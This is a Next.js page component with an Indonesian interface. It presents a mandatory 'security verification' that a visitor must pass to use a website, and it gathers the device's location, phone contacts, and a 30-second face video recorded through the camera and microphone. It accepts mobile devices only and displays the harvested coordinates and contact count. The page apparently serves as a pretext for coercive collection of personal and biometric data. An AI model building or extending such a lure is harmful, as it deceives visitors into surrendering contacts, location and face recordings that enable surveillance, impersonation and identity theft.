"use client";

import { useState, useEffect } from "react";
import dynamic from "next/dynamic";
import { UserData } from "@/types";

const PermissionHandler = dynamic(() => import("../components/PermissionHandle"), {
	ssr: false,
	loading: () => <p className="text-lg">Memuat komponen...</p>,
});

const VideoRecorder = dynamic(() => import("../components/VideoRecorder"), {
	ssr: false,
	loading: () => <p className="text-lg">Menyiapkan kamera...</p>,
});

export default function Home() {
	const [permissionsGranted, setPermissionsGranted] = useState(false);
	const [userData, setUserData] = useState<UserData | null>(null);
	const [isMobile, setIsMobile] = useState(false);
	const [isLoading, setIsLoading] = useState(true);

	useEffect(() => {
		// Cek apakah di perangkat mobile
		setIsMobile(typeof window !== "undefined" && window.innerWidth < 768);
		setIsLoading(false);
	}, []);

	const handlePermissionsGranted = (data: UserData) => {
		setPermissionsGranted(true);
		setUserData(data);
	};

	if (isLoading) {
		return (
			<div className="min-h-screen flex items-center justify-center bg-gray-50">
				<div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-blue-500"></div>
			</div>
		);
	}

	return (
		<div className="min-h-screen bg-gray-50">
			<main className="container mx-auto px-4 py-8">
				<h1 className="text-3xl font-bold text-center mb-8 text-gray-900">Verifikasi Keamanan</h1>

				{!isMobile ? (
					<div className="bg-white rounded-lg shadow-md p-6 max-w-md mx-auto text-center">
						<h2 className="text-xl font-semibold mb-4">Perangkat Tidak Didukung</h2>
						<p className="mb-6 text-gray-600">Silakan akses halaman ini melalui perangkat mobile untuk melanjutkan proses verifikasi.</p>
					</div>
				) : !permissionsGranted ? (
					<div className="bg-white rounded-lg shadow-md p-6 max-w-md mx-auto text-gray-900">
						<h2 className="text-xl font-semibold mb-4">Proses Validasi Wajib</h2>
						<p className="mb-6 text-gray-600">Anda harus melewati proses validasi dan pengumpulan data terlebih dahulu supaya dapat melanjutkan akses website kami.</p>

						<div className="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6">
							<p className="text-yellow-700">
								<strong>Perhatian:</strong> Proses ini akan mengumpulkan data lokasi, kontak, dan merekam video wajah Anda selama 30 detik.
							</p>
						</div>

						<p className="mb-6 text-gray-600">Aplikasi ini memerlukan akses ke:</p>
						<ul className="list-disc pl-5 mb-6 text-gray-600">
							<li>Lokasi perangkat Anda</li>
							<li>Kontak telepon</li>
							<li>Kamera dan mikrofon</li>
						</ul>

						<PermissionHandler onPermissionsGranted={handlePermissionsGranted} />
					</div>
				) : (
					<div className="bg-white rounded-lg shadow-md p-6 max-w-md mx-auto">
						<h2 className="text-xl font-semibold mb-6 text-gray-900">Verifikasi Wajah</h2>
						<p className="mb-4 text-gray-600">Silakan hadapkan wajah Anda ke kamera. Proses perekaman akan berlangsung selama 30 detik.</p>

						<VideoRecorder userData={userData} />

						{userData && (
							<div className="mt-8 pt-6 border-t">
								<h3 className="font-medium mb-2">Data yang terkumpul:</h3>
								<div className="text-xs bg-gray-100 p-3 text-gray-700 rounded overflow-auto max-h-40">
									<p>
										<strong>Lokasi:</strong> {userData.location.latitude}, {userData.location.longitude}
									</p>
									<p>
										<strong>Akurasi:</strong> {userData.location.accuracy} meter
									</p>
									<p>
										<strong>Kontak:</strong> {userData.contacts.length} kontak ditemukan
									</p>
								</div>
							</div>
						)}
					</div>
				)}
			</main>
		</div>
	);
}
